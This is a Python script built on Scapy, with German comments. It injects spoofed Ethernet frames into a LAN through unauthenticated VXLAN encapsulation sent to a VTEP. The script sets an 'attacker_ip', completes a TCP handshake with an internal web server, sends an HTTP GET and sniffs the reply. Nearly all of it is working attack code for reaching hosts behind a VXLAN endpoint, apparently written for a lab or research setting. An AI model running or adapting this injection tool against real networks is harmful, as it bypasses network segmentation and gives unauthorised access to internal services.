#!/usr/bin/env python

"""
Usage:
./http_asym.py IP Port debug 

./http_asym.py 10.0.0.10 80 debug

 """
from scapy.all import *
from scapy.layers.http import *
from scapy.layers import http
import random
import sys
import threading
from threading import Thread
import time
import webbrowser
import os


### Variabeln definieren
vtep_dst = "192.168.10.149"
vtep_src = "172.20.10.254" #Hier muss eine IP aus meinem Subnetz stehen, sonst verwirft der erste Hop das Paket!
vxlanport = 4789
vx_vnid = 1
mac_src = "be:fb:ef:be:fb:ef"
mac_dst = "ea:e4:59:b5:42:03" #"ff:ff:ff:ff:ff:ff"
attacker_ip = "172.20.10.10"
http_port = int(sys.argv[2])
destination_ip = sys.argv[1]
s_port = random.randint(20000,65500)

CONNECTION = {"connected": False}
CONNECTION_FINISHED = False

http_content = ""
threads = []

# TCP-Flags definieren
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

### Check if debug is enabled
if len(sys.argv) > 3:
    debug = 1
else:
    debug = 0

### VXLAN Paket: Hierueber werden Ethernet Frames ins LAN eingefuert
VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")/Ether(dst=mac_dst,src=mac_src)
### getStr ist der String im HTTP Request
getStr = 'GET / HTTP/1.1\r\nHost:' + destination_ip + '\r\nAccept-Encoding: 8bit\r\n\r\n'



def sniff_all_packets():
    sniff(session=TCPSession, filter = "tcp src port " + str(http_port), prn=packet_received, store=False, stop_filter= lambda x: CONNECTION_FINISHED)
    return

def packet_received(packet):
    payload_length = len(packet[TCP].payload)
    flags = packet.getlayer(TCP).flags
    in_seq = packet[TCP].seq
    in_ack = packet[TCP].ack
    dst_port = packet.getlayer(TCP).dport
    ack_nr = in_seq + payload_length + 1
    seq_nr = in_ack

    ### starte den connection manager Thread
    global threads
    connection_management = threading.Thread(target=TCP_connection_manager, args=(packet, payload_length, flags, in_seq, in_ack, dst_port))
    threads.append(connection_management)
    connection_management.start()
    
    ### Greife HTTP header und Payload ab
    if packet.haslayer(HTTPResponse) is True:
        global http_status
        ### http status ist die Response Status Nachricht. zB HTTP1.1/200/OK
        http_status = str(packet.getlayer(HTTPResponse).Http_Version) + " " + str(packet.getlayer(HTTPResponse).Status_Code) + " " + str(packet.getlayer(HTTPResponse).Reason_Phrase) 
    if packet.haslayer(Raw) is True:
        global http_content
        ### http content sind header und body und wird ggf aus mehreren Paketen zusammengesetzt. Nur die Layer Raw besitzt Teile von HTTP Content
        http_content += str(packet.getlayer(Raw).load)

def TCP_connection_manager(packet, payload_length, flags, in_seq, in_ack, dst_port):
    if debug:
        print("### <-- " + str(flags) + "\treceived from\t" + str(packet.getlayer(IP).src) + ":" + str(packet.getlayer(TCP).sport) + "\t\t\t\t  < ACK#: " + str(in_ack) + " | SEQ#: " + str(in_seq) + " >")
        # print ("IP Source:          " + str(packet.getlayer(IP).src) + ":" + str(packet.getlayer(TCP).sport))
        # print ("IP Destin:          " + str(packet.getlayer(IP).dst) + ":" + str(packet.getlayer(TCP).dport))
        # print("TCP Payload Length:  " + str(payload_length))
        # print("Flags:               " + str(flags))
        # print("TCP ACK#:            " + str(in_ack))
        # print("TCP SEQ#:            " + str(in_seq))
    
    global CONNECTION
    global CONNECTION_FINISHED
    #### ACK# = SEQ# + Payload Laenge + 1
    #### SEQ# = ACK#
    ack_nr = in_seq + payload_length + 1
    seq_nr = in_ack

    ### SYN/ACK oder Payload_Length > 0 received
    if payload_length > 0 or (flags & (SYN ^ ACK)) == 18:
        send_flags = 'A'
        if debug:
            print("### --> A\tsent to\t\t" + destination_ip + ":" + str(http_port) + " via VXLAN VTEP_IP: " + vtep_dst + " VNID: " + str(vx_vnid) + " < ACK#: " + str(ack_nr) + " | SEQ#: " + str(seq_nr) + " >")
        send_tcp(dst_port, seq_nr, ack_nr, send_flags)

    ### SYN/ACK received --> Connection = True
        if (flags & (SYN ^ ACK)) == 18:
           CONNECTION = { "connected": True , "dst_port": dst_port, "seq_nr": seq_nr, "ack_nr": ack_nr}

    ### FIN received --> Connection is finished
    if flags & FIN:
        send_flags = 'F''A'
        if debug:
            print("### --> FA\tsent to\t\t" + destination_ip + ":" + str(http_port) + " via VXLAN VTEP_IP: " + vtep_dst + " VNID: " + str(vx_vnid) + " < ACK#: " + str(ack_nr) + " | SEQ#: " + str(seq_nr) + " >")
        send_tcp(dst_port, seq_nr, ack_nr, send_flags)
        CONNECTION_FINISHED = True
    return

def send_tcp(src_port, seqnr, acknr, tcp_flags):
    ack = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags=tcp_flags)
    out_ack = send(ack, verbose=0)
    return

def send_request():
    while CONNECTION["connected"] is not True:
        time.sleep(0.01)
    syn_ack_received_send_http_req(CONNECTION["dst_port"], CONNECTION["seq_nr"], CONNECTION["ack_nr"])

def syn_ack_received_send_http_req(src_port, seqnr, acknr):
    http_request = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags='P''A') / getStr
    send(http_request, verbose=0)
    if debug:
        print("### --> PA\tsent to\t\t" + destination_ip + ":" + str(http_port) + " via VXLAN VTEP_IP: " + vtep_dst + " VNID: " + str(vx_vnid) + " < ACK#: " + str(acknr) + " | SEQ#: " + str(seqnr) + " > (HTTP Request)")

def fin_function():
    ### Wait until FIN packet is received
    while CONNECTION_FINISHED is not True:
        time.sleep(0.2)
    ### Connection is Finished --> FIN Packet Received
    print ("\r\n\r\n")
    print(http_status)
    print("")
    print(http_content)
        ### Oeffne Google Chrome mit der Website
    # http_body = http_content.partition("\r\n\r\n")[2]
    # f = open("website.html", "w")
    # f.write(http_body)
    # f.close()
    # new = 2
    # url = "/home/ben/http_request/website.html"
    # os.system('sudo -u ben google-chrome-stable /home/ben/http_request/website.html')
    # return




SNIFFER = threading.Thread(target=sniff_all_packets)
Fin_Thread = threading.Thread(target=fin_function)
send_request_thread = threading.Thread(target=send_request)
### starte die Threads
send_request_thread.start()
Fin_Thread.start()
SNIFFER.start()

time.sleep(1)


#$$$$$ SEND SYN
syn = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(sport=s_port, dport=http_port, flags='S')
send(syn, verbose=0)
if debug:
       print("### --> S\tsent to\t\t" + destination_ip + ":" + str(http_port) + " via VXLAN VTEP_IP: " + vtep_dst + " VNID: " + str(vx_vnid) + " < SEQ#: 0 >")


